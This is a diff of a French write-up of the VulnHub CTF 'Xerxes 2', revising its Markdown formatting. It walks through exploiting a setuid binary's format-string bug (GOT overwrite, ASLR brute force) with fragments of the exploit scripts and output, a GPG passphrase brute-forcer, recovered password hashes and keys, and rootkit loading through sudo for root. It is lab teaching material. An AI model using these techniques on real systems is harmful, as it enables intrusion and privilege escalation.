@@ -3,15 +3,13 @@ title: "Solution du CTF Xerxes 2 de VulnHub"
 tags: [CTF,VulnHub]
 ---
 
-Présentation
-------------
+## Présentation
 
 [Xerxes 2](http://vulnhub.com/entry/xerxes-2,97/) est comme son nom l'indique le second de la série des *Xerxes*. [Le premier du nom]({% link _posts/2014-03-07-Solution-du-CTF-Xerxes-de-VulnHub.md %}) était l'un des premiers CTF auquel je me suis attaqué parmi ceux disponibles sur *VulnHub*. Le challenge était intéressant mais il y avait un peu trop de guessing à mon goût, c'est donc avec une certaine appréhension que je me lançais sur le second opus.  
 
-Première énigme
----------------
+## Première énigme
 
-```plain
+```
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-04 21:47 CEST
 Nmap scan report for 192.168.1.32
 Host is up (0.00018s latency).
@@ -46,23 +44,23 @@ MAC Address: 00:0C:29:CA:B1:03 (VMware)
 
 *Nmap* nous indique un service inconnu qui semble retourner du base64. On remarque aussi un serveur HTTP *lighttpd*.  
 
-Sur ce dernier *dirb* ne trouve pas grand chose de bien intéressant :  
+Sur ce dernier *dirb* ne trouve pas grand-chose de bien intéressant :  
 
-```plain
+```
 ---- Scanning URL: http://192.168.1.32/ ----
 + http://192.168.1.32/.bash_history (CODE:200|SIZE:0)
 + http://192.168.1.32/~sys~ (CODE:403|SIZE:345)
 ```
 
-Malgré la présence d'un fichier *.bash\_history* on ne trouve pas d'autres fichiers susceptibles d'être présents dans un dossier personnel.  
+Malgré la présence d'un fichier `.bash_history` on ne trouve pas d'autres fichiers susceptibles d'être présents dans un dossier personnel.  
 
 On aurait pu espérer des clés SSH mais le challenge aurait perdu en intérêt.  
 
-Aussi le serveur semble renvoyer des erreurs 403 pour les noms de fichiers contenant *sys* ou ayant une extension *.inc*, sans doute l'effet d'un *.htaccess*.  
+Aussi le serveur semble renvoyer des erreurs 403 pour les noms de fichiers contenants `sys` ou ayant une extension `.inc`, sans doute l'effet d'un `.htaccess`.  
 
 Je décide de passer au port 444 qui nous renvoie un texte base 64 :  
 
-```plain
+```console
 $ ncat 192.168.1.32 4444 > base64.txt
 $ base64 -d base64.txt > raw.bin
 $ file raw.bin
@@ -75,15 +73,15 @@ En fond sonore on entend des sons comme ceux d'un modem et des modulations de fr
 
 N'ayant pas vraiment le courage de persister (justement) dans cette voix (ou voie :), je décide de lancer un second scan de port. Une nouvelle habitude qui me vient [du CTF Hackademic RTB2]({% link _posts/2014-04-04-Solution-du-CTF-Hackademic-RTB2-de-VulnHub.md %}) (je suis pris de convulsions quand j'en parle :p).  
 
-Et effectivement on voit un nouveau port ouvert, preuve qu'un démon de *port-knocking* est à l'oeuvre (le fichier audio referme peut-être l'ordre des ports à *knocker*... ça je ne le saurais que plus tard en lisant la solution des autres participants dès que j'aurais publié la mienne).  
+Et effectivement on voit un nouveau port ouvert, preuve qu'un démon de *port-knocking* est à l'œuvre (le fichier audio referme peut-être l'ordre des ports à *knocker*... ça je ne le saurai que plus tard en lisant la solution des autres participants dès que j'aurais publié la mienne).  
 
-```plain
+```
 8888/tcp  open  http    Tornado httpd 2.3
 |_http-methods: No Allow or Public header in OPTIONS response (status code 405)
 |_http-title: IPython Dashboard
 ```
 
-La bannière *Tornado* parlera peut-être aux développeurs Python. C'est un framework web simple et léger qui a fait parlé de lui fut un temps (maintenant on entend plus parler de *Flask*).  
+La bannière *Tornado* parlera peut-être aux développeurs Python. C'est un framework web simple et léger qui a fait parler de lui fut un temps (maintenant on entend plus parler de *Flask*).  
 
 Dessus tourne un *IPython*. C'est un interpréteur Python en interface web. Le but d'un tel logiciel est pédagogique (permettre l'apprentissage du langage en ligne).  
 
@@ -93,9 +91,9 @@ Mais est-ce que des limitations ont été mises en place pour empêcher l'accès
 
 ![Lancement de la backdoor en démon](/assets/img/ipython_tshd_launch.png)
 
-Avec un serveur *tshd* lancé j'obtiens facilement un shell mais après un moment la connexion est coupée avec l'affichage d'un message (*Xerxes Guard, connexion non autorisée*). Toutefois le temps de connexion dont on dispose est amplement suffisant pour placer une clé SSH publique dans un nouveau fichier *authorized\_keys*. De cette façon on obtient une connexion *"légale"* non terminée par le programme de surveillance :  
+Avec un serveur *tshd* lancé j'obtiens facilement un shell, mais après un moment la connexion est coupée avec l'affichage d'un message (*Xerxes Guard, connexion non autorisée*). Toutefois, le temps de connexion dont on dispose est amplement suffisant pour placer une clé SSH publique dans un nouveau fichier `authorized_keys`. De cette façon, on obtient une connexion *légale* non terminée par le programme de surveillance :  
 
-```plain
+```console
 $ ssh delacroix@192.168.1.32
 Enter passphrase for key '/home/devloop/.ssh/id_rsa': 
 
@@ -114,13 +112,13 @@ _d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM
 delacroix@xerxes2:~$
 ```
 
-Dans les processus on découvre que le serveur qui écoute sur le port 444 n'est rien d'autre qu'un *netcat* lancé en boucle :  
+Dans les processus, on découvre que le serveur qui écoute sur le port 444 n'est rien d'autre qu'un *netcat* lancé en boucle :  
 
-```plain
+```
 polito    2167  0.0  0.1   1936   568 ?        Ss   12:46   0:00 /bin/sh -c while true ; do nc -l -p 4444 < /home/polito/audio.txt ; done
 ```
 
-Dans le home de l'utilisateur *delacroix* via lequel on est connecté on trouve un code C baptisé *bf.c*. Il s'agit d'un interpréteur [Brainfuck](https://fr.wikipedia.org/wiki/Brainfuck).  
+Dans le home de l'utilisateur `delacroix` via lequel on est connecté on trouve un code C baptisé `bf.c`. Il s'agit d'un interpréteur [Brainfuck](https://fr.wikipedia.org/wiki/Brainfuck).  
 
 Dans l'historique bash on retrouve des références à ce fichier :  
 
@@ -137,50 +135,48 @@ exit
 
 La commande *BrainFuck* présente dans l'historique fait afficher le message *"LOOK DEEPER"*.  
 
-La version compilée de *bf.c* se trouve aussi sous */opt/bf* et est setuid *polito*.  
+La version compilée de `bf.c` se trouve aussi sous `/opt/bf` et est setuid `polito`.  
 
-Au passage dans */etc/passwd* on trouve 3 utilisateurs :  
+Au passage dans `/etc/passwd` on trouve 3 utilisateurs :  
 
-```plain
+```
 korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
 polito:x:1001:1001:Janice Polito,,,:/home/polito:/bin/bash
 delacroix:x:1002:1002:Marie St. Anne Delacroix,,,:/home/delacroix:/bin/bash
 ```
 
-Seconde énigme
---------------
+## Seconde énigme
 
 Le binaire setuid est dynamiquement lié et non strippé. Mais comme on dispose du code source on devrait se débrouiller :)  
 
-```plain
+```
 /opt/bf: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
 dynamically linked (uses shared libs), for GNU/Linux 2.6.26,
 BuildID[sha1]=0x41b268c4f7d19d3a6ecf9ab948c42192c232c5d2, not stripped
 ```
 
-Le fonctionnement du programme *bf* est assez simple : il interprète le code *BrainFuck* qu'il reçoit en argument.  
+Le fonctionnement du programme `bf` est assez simple : il interprète le code *BrainFuck* qu'il reçoit en argument.  
 
-Dans le *main()* est défini un buffer de 30000 caractères qui sert de mémoire pour le *BrainFuck*.  
+Dans le `main()` est défini un buffer de 30000 caractères qui sert de mémoire pour le *BrainFuck*.  
 
-Les instructions de déplacement classiques de ce langage ésotérique (dont la virgule qui fait un *getchar*, le point qui fait un *putchar*) sont supportées.  
+Les instructions de déplacement classiques de ce langage ésotérique (dont la virgule qui fait un `getchar`, le point qui fait un `putchar`) sont supportées.  
 
-Par contre on remarque rapidement une nouvelle instruction vulnérable à une faille de chaîne de format :  
+Par contre, on remarque rapidement une nouvelle instruction vulnérable à une faille de chaîne de format :  
 
 ```c
-
-   case '#':
+case '#':
     // new feature
     printf(buf);
     break;
 ```
 
-Pour toute la partie exploitation de chaines de format je vous renvoie vers [mon tutoriel sur le sujet]({% link _posts/2014-08-04-Pwing-echo-Exploitation-d-une-faille-de-chaine-de-format.md %}).  
+Pour toute la partie exploitation de chaines de format, je vous renvoie vers [mon tutoriel sur le sujet]({% link _posts/2014-08-04-Pwing-echo-Exploitation-d-une-faille-de-chaine-de-format.md %}).  
 
 Ici on va s'attarder un peu sur le fait que le programme est lié dynamiquement (au lieu d'être statique comme dans mon tutoriel).  
 
-Via la commande *nm* on voit les symboles du binaire dont la *GOT* (*Global Offset Table*) :  
+Via la commande `nm`, on voit les symboles du binaire dont la `GOT` (`Global Offset Table`) :  
 
-```plain
+```console
 $ nm /opt/bf
 08049948 d _DYNAMIC
 08049a3c d _GLOBAL_OFFSET_TABLE_
@@ -227,47 +223,47 @@ $ nm /opt/bf
 
 On voit également les fonctions utilisées par le binaire.  
 
-Sur le système du challenge, l'[ASLR](http://fr.wikipedia.org/wiki/Address_space_layout_randomization) est activée. Par conséquent ça semble être une mauvaise idée de placer un shellcode dans l'environnement comme on avait pu le faire sur le CTF *Hell*.  
+Sur le système du challenge, l'[ASLR](http://fr.wikipedia.org/wiki/Address_space_layout_randomization) est activée. Par conséquent, ça semble être une mauvaise idée de placer un shellcode dans l'environnement comme on avait pu le faire sur le CTF [Hell]({% link _posts/2014-07-13-Solution-du-CTF-Hell-1.md %}).  
 
 Du coup ou peut-on le placer ? On peut se servir de l'instruction virgule du *BrainFuck* pour placer le shellcode dans le buffer (octet par octet). Il ne reste plus qu'à trouver un moyen de faire sauter le programme vers le buffer.  
 
-Cela est possible grâce à l'outil [ROPgadget](http://shell-storm.org/project/ROPgadget/) qui m'a trouvé un gadget *pop-ret* présent dans le segment de code. Ainsi :  
+Cela est possible grâce à l'outil [ROPgadget](http://shell-storm.org/project/ROPgadget/) qui m'a trouvé un gadget `pop-ret` présent dans le segment de code. Ainsi :  
 
-* On écrase l'adresse de *printf* (ou *exit*) dans la *GOT* (de manière similaire à l'écrasement de *\_\_fini\_array\_start* sur le CTF *Hell*)
-* L'adresse qui vient écraser est celle de l'instruction *pop-ret* trouvée dans le code de *bf* qui permet de retirer un mot sur la pile et de sauter sur le buffer
-* On provoque ensuite un nouvel appel à *printf* (ou *exit*) ce qui provoque la suite d'instructions voulue (l'exécution du shellcode)
+* On écrase l'adresse de `printf` (ou `exit`) dans la `GOT` (de manière similaire à l'écrasement de `__fini_array_start` sur le CTF *Hell*)
+* L'adresse qui vient écraser est celle de l'instruction `pop-ret` trouvée dans le code de `bf` qui permet de retirer un mot sur la pile et de sauter sur le buffer
+* On provoque ensuite un nouvel appel à `printf` (ou `exit`) ce qui provoque la suite d'instructions voulue (l'exécution du shellcode)
 
-Seulement au moment où le programme saute sur les instructions écrites dans le buffer : *SIGSEV* !  
+Seulement au moment où le programme saute sur les instructions écrites dans le buffer : `SIGSEV` !  
 
 La stack n'est pas exécutable... pas besoin d'aller chercher plus loin.  
 
-Grat-grat de la tête... Comment va t'on faire ? Le binaire dispose de quelques instructions pour du *ROP* ([Return Object Programming](http://en.wikipedia.org/wiki/Return-oriented_programming)) mais trop peu pour faire quelque chose d'intéressant. En particulier le programme étant linké, il ne dispose pas d'instructions *int 0x80*.  
+Grat-grat de la tête... Comment va-t-on faire ? Le binaire dispose de quelques instructions pour du *ROP* ([Return Object Programming](http://en.wikipedia.org/wiki/Return-oriented_programming)) mais trop peu pour faire quelque chose d'intéressant. En particulier le programme étant linké, il ne dispose pas d'instructions `int 0x80`.  
 
-Un ret-into-libc ? La fonction *system* n'est pas utilisée et les fonctions affichées par *nm* ne vont pas vraiment nous être utiles.  
+Un ret-into-libc ? La fonction `system` n'est pas utilisée et les fonctions affichées par `nm` ne vont pas vraiment nous être utiles.  
 
-Sur [un document venant de .aware network](http://www.exploit-db.com/papers/13143/) quelqu'un affirmait qu'il était possible de placer le shellcode dans une section comme *DYNAMIC*... mais le résultat n'était pas meilleur.  
+Sur [un document venant de .aware network](http://www.exploit-db.com/papers/13143/) quelqu'un affirmait qu'il était possible de placer le shellcode dans une section comme `DYNAMIC`... mais le résultat n'était pas meilleur.  
 
 Le document qui m'a le plus aidé fut [celui de *danigargru* intitulé *GOT Dereferencing / Overwriting - ASLR/NX Bypass (Linux)*](http://danigargu.blogspot.com.es/2013/02/got-dereferencing-overwriting-aslrnx.html).  
 
-Il explique dans ce document qu'une fois la libc chargée en mémoire, la distance qui sépare deux fonctions (toujours les même) ne change jamais même avec l'*ASLR* activée. Par conséquent si on obtient l'adresse de *printf* on est en mesure de calculer celle de *system* :)  
+Il explique dans ce document qu'une fois la libc chargée en mémoire, la distance qui sépare deux fonctions (toujours les mêmes) ne change jamais même avec l'*ASLR* activée. Par conséquent, si on obtient l'adresse de `printf` on est en mesure de calculer celle de `system` :)  
 
-Mais avant de se lancer dans l'exploitation, petite interlude sur le rôle de la *Global Offset Table*.  
+Mais avant de se lancer dans l'exploitation, petit interlude sur le rôle de la `Global Offset Table`.  
 
 Au lancement d'un programme compilé dynamiquement, le système doit pouvoir déterminer quelles librairies sont requises par le programme et à quelles fonctions et objets de ces librairies il va accéder.  
 
-Pour cela le binaire ELF contient différentes sections contenant les noms des librairies et de ces fonctions. Tout cela est visible avec des utilitaires comme *ldd* et *nm*.  
+Pour cela le binaire ELF contient différentes sections contenant les noms des librairies et de ces fonctions. Tout cela est visible avec des utilitaires comme `ldd` et `nm`.  
 
-Le binaire dispose d'une table (la GOT) qui est vide mais que le système d'exploitation va remplir quand le programme est chargé en mémoire à son lancement. C'est le système qui se charge de charger en mémoire les librairies requises, de résoudre les adresses des symboles et de remplir la GOT dans la mémoire du programme.  
+Le binaire dispose d'une table (la GOT) qui est vide, mais que le système d'exploitation va remplir quand le programme est chargé en mémoire à son lancement. C'est le système qui se charge de charger en mémoire les librairies requises, de résoudre les adresses des symboles et de remplir la GOT dans la mémoire du programme.  
 
 Ci-dessous vous trouverez des exemples concrets avec gdb mais avant il y a deux éléments à savoir concernant la situation actuelle.  
 
 Premièrement quand vous déboguez un programme setuid, les privilèges sont droppés. *Captain Obvious* dirait que sinon ce serait la porte ouverte à toutes les portes dérobées (merci *Captain Obvious* !)  
 
-Deuxièmement quand l'*ASLR* est activée sur le système, *gdb* la désactive par défaut pour le programme débogué. C'est pratique car ça permet de retrouver ses objets aux même adresses d'une session à une autre mais ce n'est pas toujours ce que l'on souhaite. Tout ça se paramètre via la commande *set disable-randomization (on/off)*.  
+Deuxièmement quand l'*ASLR* est activée sur le système, *gdb* la désactive par défaut pour le programme débogué. C'est pratique, car ça permet de retrouver ses objets aux mêmes adresses d'une session à une autre, mais ce n'est pas toujours ce que l'on souhaite. Tout ça se paramètre via la commande `set disable-randomization (on/off)`.  
 
-Voyons comment est résolu le symbole *printf* avant de lancer l'exécutable :  
+Voyons comment est résolu le symbole `printf` avant de lancer l'exécutable :  
 
-```plain
+```
 (gdb) p printf
 $1 = {<text variable, no debug info>} 0x8048390 <printf@plt>
 
@@ -289,11 +285,11 @@ $1 = {<text variable, no debug info>} 0x8048390 <printf@plt>
 0x8049a44 <_GLOBAL_OFFSET_TABLE_+8>:	0x00000000
 ```
 
-Pour accéder finalement à *printf* le binaire doit passer par tout une série de *jmp* qui amène à la *GOT* qui est pour le moment vide.  
+Pour accéder finalement à `printf` le binaire doit passer par toute une série de `jmp` qui amène à la `GOT` qui est pour le moment vide.  
 
-Suivons le même chemin une fois le programme chargé mais avant que *printf* n'ait été appelé une première fois (breakpoint sur *main*) :  
+Suivons le même chemin une fois le programme chargé, mais avant que `printf` n'ait été appelé une première fois (breakpoint sur `main`) :  
 
-```plain
+```
 (gdb) p printf
 $1 = {<text variable, no debug info>} 0xb7eb8f50 <__printf>
 
@@ -315,11 +311,11 @@ $1 = {<text variable, no debug info>} 0xb7eb8f50 <__printf>
 0x8049a44 <_GLOBAL_OFFSET_TABLE_+8>:	0xb7ff59b0
 ```
 
-Cette fois la *GOT* est remplie, et le symbole est résolu directement à *0xb7eb8f50* qui est l'adresse de *printf* dans la *libc* chargée en mémoire.  
+Cette fois la *GOT* est remplie et le symbole est résolu directement à `0xb7eb8f50` qui est l'adresse de `printf` dans la libc chargée en mémoire.  
 
-Et quel est l'état une fois que *printf* a été appelé ?  
+Et quel est l'état une fois que `printf` a été appelé ?  
 
-```plain
+```
 (gdb) p printf
 $1 = {<text variable, no debug info>} 0xb7eb8f50 <__printf>
 
@@ -341,13 +337,13 @@ $1 = {<text variable, no debug info>} 0xb7eb8f50 <__printf>
 0x8049a44 <_GLOBAL_OFFSET_TABLE_+8>:	0xb7ff59b0
 ```
 
-Ici le chemin est encore plus court car l'adresse est aussi placée dans la *PLT* (*Procedure Linkage Table*).  
+Ici le chemin est encore plus court, car l'adresse est aussi placée dans la `PLT` (`Procedure Linkage Table`).  
 
-L'adresse que l'on va écraser est celle qui se trouve à *0x8049a48*.  
+L'adresse que l'on va écraser est celle qui se trouve à `0x8049a48`.  
 
-On peut l'obtenir plus rapidement en affichant les rellocations du programme avec *objdump* :  
+On peut l'obtenir plus rapidement en affichant les relocations du programme avec `objdump` :  
 
-```plain
+```console
 $ objdump -R bf
 
 bf:     format de fichier elf32-i386                                                                                                                                                                           
@@ -364,26 +360,25 @@ OFFSET   TYPE              VALUE
 08049a60 R_386_JUMP_SLOT   putchar
 ```
 
-Exploitation de la chaine de format (1er cas : brute-force ASLR)
-----------------------------------------------------------------
+## Exploitation de la chaine de format (1er cas : brute-force ASLR)
 
-Récapitulatif de notre objectif : écraser l'adresse de *printf* dans la *GOT* par celle de *system* en utilisant la technique de *danigargru*.  
+Récapitulatif de notre objectif : écraser l'adresse de `printf` dans la *GOT* par celle de `system` en utilisant la technique de *danigargru*.  
 
-Ma première idée pour récupérer l'adresse de *printf* était d'utiliser *%s* en mettant l'adresse de la *GOT* sur la pile et utiliser un formateur de position pour l'afficher (donc *"\0x48\x9a\x04\x08%16$s"*).  
+Ma première idée pour récupérer l'adresse de `printf` était d'utiliser `%s` en mettant l'adresse de la *GOT* sur la pile et utiliser un formateur de position pour l'afficher (donc `\0x48\x9a\x04\x08%16$s`).  
 
 Seulement comme j'ai déjà pu l'évoquer sur mon writeup de *Hell*, communiquer avec un programme est parfois plus compliqué que ce que l'on pense.  
 
-Ici le programme */opt/bf* ne flush jamais les données affichées. Du coup malgré tous mes essais, impossible de récupérer l'output du *%s* même si le programme se bloque ensuite sur un appel à *getchar*. Les données de sortie ne sont retournée qu'à la fin de l'exécution du programme :(  
+Ici le programme `/opt/bf` ne flushe jamais les données affichées. Du coup malgré tous mes essais, impossible de récupérer l'output du `%s` même si le programme se bloque ensuite sur un appel à `getchar`. Les données de sortie ne sont retournée qu'à la fin de l'exécution du programme :(  
 
-J'ai tenté de trouver une solution alternative mais arrivé à cours d'idée j'ai choisi de bruteforcer l'adresse de *system*.  
+J'ai tenté de trouver une solution alternative, mais arrivé à cours d'idée j'ai choisi de bruteforcer l'adresse de `system`.  
 
-Le principe d'une attaque brute-force sur l'*ASLR* est connu de longue date mais je ne savais pas dans quel mesure cela serait effectif.  
+Le principe d'une attaque brute-force sur l'*ASLR* est connu de longue date, mais je ne savais pas dans quelle mesure cela serait effectif.  
 
-Avec *gdb* on peut voir que pour chaque lancement du programme l'adresse de *system* change mais conserve tout de même certains octets (au début et à la fin).  
+Avec *gdb* on peut voir que pour chaque lancement du programme l'adresse de `system` change, mais conserve tout de même certains octets (au début et à la fin).  
 
-Notez que le fait que l'adresse de *system* se termine par un octet nul n'est sans doute pas un hasard mais une protection contre les attaques *ret-into-libc*.  
+Notez que le fait que l'adresse de `system` se termine par un octet nul n'est sans doute pas un hasard, mais une protection contre les attaques *ret-into-libc*.  
 
-```plain
+```
 (gdb) set disable-randomization off
 (gdb) p system
 $2 = {<text variable, no debug info>} 0xb76ae000 <system>
@@ -395,17 +390,17 @@ $3 = {<text variable, no debug info>} 0xb7617000 <system>
 $4 = {<text variable, no debug info>} 0xb7645000 <system>
 ```
 
-Pour me faire une idée du temps que le brute force de l'*ASLR* prendrait j'ai créé un simple programme C qui fait un *printf("%p", system)*.  
+Pour me faire une idée du temps que le brute force de l'*ASLR* prendrait j'ai créé un simple programme C qui fait un `printf("%p", system)`.  
 
-Par dessus j'ai créé un script Python qui lance le programme en boucle et compte le nombre de lancements effectués avant d'obtenir une adresse déjà affichée.  
+Par-dessus j'ai créé un script Python qui lance le programme en boucle et compte le nombre de lancements effectués avant d'obtenir une adresse déjà affichée.  
 
 Et le résultat est plus que positif : en moyenne une vingtaine de tentatives suffit à retomber sur une précédente adresse.  
 
 Pourquoi c'est aussi simple ? Principalement parce que le système est un 32 bits et que la VM n'a que 512 Mo de RAM ce qui réduit les possibilités de randomisation (l'espace d'adressage est suffisamment petit).  
 
-Par conséquent l'exploit suivant effectue simplement une boucle en utilisant une adresse pour *system* obtenue lors de l'un des essais (*0xb762a000*).  
+Par conséquent l'exploit suivant effectue simplement une boucle en utilisant une adresse pour `system` obtenue lors de l'un des essais (`0xb762a000`).  
 
-Le payload effectue différentes commandes dont la dernière est la création d'un fichier */tmp/hacked.txt* ce qui nous permet de déterminer si l'exploit a fonctionné.  
+Le payload effectue différentes commandes dont la dernière est la création d'un fichier `/tmp/hacked.txt` ce qui nous permet de déterminer si l'exploit a fonctionné.  
 
 ```python
 import subprocess
@@ -480,16 +475,15 @@ while True:
 fd.close()
 ```
 
-L'exécution de cet exploit ne prend que quelques secondes. Ce n'est pas parfait mais on obtient les droits de l'utilisateur *polito* comme attendu.  
+L'exécution de cet exploit ne prend que quelques secondes. Ce n'est pas parfait, mais on obtient les droits de l'utilisateur `polito` comme attendu.  
 
-Exploitation de la chaîne de format (2nd cas : dialogue avec mon tty)
----------------------------------------------------------------------
+## Exploitation de la chaîne de format (2nd cas : dialogue avec mon tty)
 
-Après avoir complété le challenge, j'ai décidé de reprendre l'attaque du binaire */opt/bf*. A force de recherche j'ai trouvé un exemple de code pas très beau mais fonctionnel pour dialoguer octet après octet avec le programme.  
+Après avoir complété le challenge, j'ai décidé de reprendre l'attaque du binaire `/opt/bf`. À force de recherche, j'ai trouvé un exemple de code pas très beau, mais fonctionnel pour dialoguer octet après octet avec le programme.  
 
-Le principe est de lancer le programme dans un *pty* en code canonique ([voir mon article sur les terminaux](http://devloop.users.sourceforge.net/index.php?article46/pseudo-terminaux-portes-derobees-telnet-et-tunneling)).  
+Le principe est de lancer le programme dans un *pty* en code canonique ([voir mon article sur les terminaux]({% link _posts/2011-01-11-Pseudo-terminaux-portes-derobees-telnet-et-tunneling.md %})).  
 
-De cette façon on peut complètement automatiser l'exploitation du binaire qui premièrement récupère la distance entre *printf* et *system*, deuxièmement obtient l'adresse de *printf* via *%s*, troisièmement calcule l'adresse courante de *system*, et finalement écrase la *GOT* et exécute notre payload :  
+De cette façon, on peut complètement automatiser l'exploitation du binaire qui premièrement récupère la distance entre `printf` et `system`, deuxièmement obtient l'adresse de `printf` via `%s`, troisièmement calcule l'adresse courante de `system`, et finalement écrase la *GOT* et exécute notre payload :  
 
 ```python
 import tty
@@ -640,7 +634,7 @@ else:
 
 Il ne reste alors qu'à mettre les pieds sous la table :  
 
-```plain
+```console
 delacroix@xerxes2:~$ python exploit.py
 [i] devloop exploit for Xerxes 2 /opt/bf - fully automated
 [*] Getting printf address in GOT with objdump
@@ -661,19 +655,18 @@ uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) grou
 
 POUNED !  
 
-Troisème énigme
----------------
+## Troisème énigme
 
-On trouve dans le dossier personnel de *polito* un fichier PDF particulier :  
+On trouve dans le dossier personnel de `polito` un fichier PDF particulier :  
 
-```plain
+```console
 $ file polito.pdf
 polito.pdf: DOS/MBR boot sector
 ```
 
-Avec *hexdump* on s’aperçoit que le fichier contient deux headers PDF, l'un avec le texte suivant :  
+Avec `hexdump` on s’aperçoit que le fichier contient deux headers PDF, l'un avec le texte suivant :  
 
-```plain
+```
 --WARNING--
 Unauthorized file access will be reported..
 XERXES wishes you a most productive day
@@ -685,11 +678,11 @@ Mais il n'y a rien à voir du côté du *QRcode* qui correspond seulement au tex
 
 L'image du code est en grayscale et l'ancien CTF cachait des données dans le canal alpha qui n'existe pas ici.  
 
-On trouve aussi un fichier *dump.gpg* et comme il n'y a aucune paire de clé dans le dossier *.gnupg* on devine que ce fichier est chiffré avec un algo symétrique.  
+On trouve aussi un fichier `dump.gpg` et comme il n'y a aucune paire de clé dans le dossier `.gnupg` on devine que ce fichier est chiffré avec un algo symétrique.  
 
 Étrangement l'entête de secteur de boot dans le PDF ne m'a pas choqué plus que ça (sans doute parce que j'avais vu un cas similaire plus tôt dans un article... mais comble de l'idiotie ça devait être un writeup pour un autre CTF).  
 
-Au lieu de m'y intéresser j'ai écrit un brute-forceur *GPG* qui utilise les options *-d* (*decrypt*), *--batch* et *--passphrase* de gnupg :  
+Au lieu de m'y intéresser j'ai écrit un brute-forcer *GPG* qui utilise les options `-d` (`decrypt`), `--batch` et `--passphrase` de gnupg :  
 
 ```python
 import subprocess
@@ -720,7 +713,7 @@ null.close()
 
 On obtient un output de ce style (comptez plusieurs heures) :  
 
-```plain
+```
 --- snip ---
 [-] Testing adesan
 [-] Testing ZOEY11
@@ -731,25 +724,25 @@ On obtient un output de ce style (comptez plusieurs heures) :
 [*] Found password Janus
 ```
 
-Sauf que le fichier dump de 43Mo déchiffré via le mot de passe *Janus* semble contenir ni plus ni moins des données aléatoires.  
+Sauf que le fichier dump de 43Mo déchiffré via le mot de passe `Janus` semble contenir ni plus ni moins des données aléatoires.  
 
 Un coup de chance (ou de malchance) en fait...  
 
 Après avoir retrouvé mes esprits je lance le PDF directement dans *QEMU* :  
 
-```plain
+```console
 $ qemu-system-i386 polito.pdf
 ```
 
 ![QEMU lancement PDF secteur de boot](/assets/img/qemu.png)
 
-Le fichier dump déchiffré avec cette clé contient des données plus réalistes mais sans réelle organisation : il doit s'agir d'un dump mémoire.  
+Le fichier dump déchiffré avec cette clé contient des données plus réalistes, mais sans réelle organisation : il doit s'agir d'un dump mémoire.  
 
 Notamment en faisant une recherche dans le dump on trouve des hashs :  
 
 ![Dump mémoire contenant les hashs des mots de passe](/assets/img/dump_clear.png)
 
-```plain
+```
 root:$6$qG30pAPS$2KbWjBGDMia6UVxbQfZ4M.K9ZU6ya80lrx0FsSW0kIOXxODW6vjHpjBIfbS5OmC0R3y7cAkCtvAxCqLxcXjlH/:16195:0:99999:7
 korenchkin:$6$WjgI1TzN$u8gOd9v8jR2ffDGWGOwtxc58yczo5fsZy40TM84pct.iSmlwRA4yV3.tdPnn5b8AWiQ.tnqUeInSQqkVEI2z3.:16221:0:99999:7:::
 polito:$6$ZZse8bfp$Etf3yb4xeswzZhS.VVQ1admvpXXuBQjTabwaT9qitZ0NDDZICRlsBI.KtwNTy7MgZuLw9l7h7WS7MAwJ96t9X0:16195:0:99999:7:::
@@ -758,15 +751,15 @@ delacroix:$6$BuJUKaXI$YLabcN56.SjHYe71yUa5KArlafGaV3wXYVoXzbtJacbP77h193/HbiXxP6
 
 Mais ces derniers ne sont pas en ceux en cours :(  
 
-Sur le système de fichier se trouve un fichier chiffré via *openssl* appartenant à *korenchkin* (le contenu du fichier commence par *Salted\_\_* ce qui est propre à *openssl*).  
+Sur le système de fichier se trouve un fichier chiffré via `openssl` appartenant à *korenchkin* (le contenu du fichier commence par `Salted__` ce qui est propre à `openssl`).  
 
-```plain
+```console
 polito@xerxes2:~$ ls /opt/backup/ -l
 total 12
 -rw-r--r-- 1 korenchkin korenchkin 10272 Jul 16 11:24 korenchkin.tar.enc
 ```
 
-Du coup on fait une recherche sur *openssl* dans le dump et on fini par trouver :  
+Du coup, on fait une recherche sur `openssl` dans le dump et on fini par trouver :  
 
 ```bash
 openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in korenchkin.tar -out korenchkin.tar.enc
@@ -778,20 +771,19 @@ La commande inverse est donc :
 openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu  -in korenchkin.tar.enc -out korenchkin.tar
 ```
 
-Cette fois on a une paire de clés SSH qui nous permettent de devenir *korenchkin* :  
+Cette fois, on a une paire de clés SSH qui nous permettent de devenir `korenchkin` :  
 
-```plain
+```console
 $ tar tvf korenchkin.tar 
 -rw------- korenchkin/korenchkin 1675 2014-07-16 20:17 .ssh/id_rsa
 -rw-r--r-- korenchkin/korenchkin  400 2014-07-16 20:17 .ssh/id_rsa.pub
 ```
 
-Quatrième énigme
-----------------
+## Quatrième énigme
 
 L'utilisateur a des permissions *sudo* pour charger et décharger des modules kernel :  
 
-```plain
+```console
 korenchkin@xerxes2:~$ sudo -l
 Matching Defaults entries for korenchkin on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -800,18 +792,18 @@ User korenchkin may run the following commands on this host:
     (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
 ```
 
-J'ai choisi d'utiliser une rootkit LKM [décrite sur le blog de memset](http://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/) :  
+J'ai choisi d'utiliser un rootkit LKM [décrite sur le blog de memset](http://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/) :  
 
-Il faut seulement changer dans le code l'adresse de la *sys\_call\_table* par celle effective du système :  
+Il faut seulement changer dans le code l'adresse de la `sys_call_table` par celle effective du système :  
 
-```plain
+```console
 korenchkin@xerxes2:~$ grep sys_call_table /boot/System.map-3.2.0-4-686-pae 
 c12cce90 R sys_call_table
 ```
 
-Après on insère la rootkit et on utilise le programme d'exemple :  
+Après on insère le rootkit et on utilise le programme d'exemple :  
 
-```plain
+```console
 korenchkin@xerxes2:~$ sudo insmod rootkit.ko 
 korenchkin@xerxes2:~$ ./test
 # id
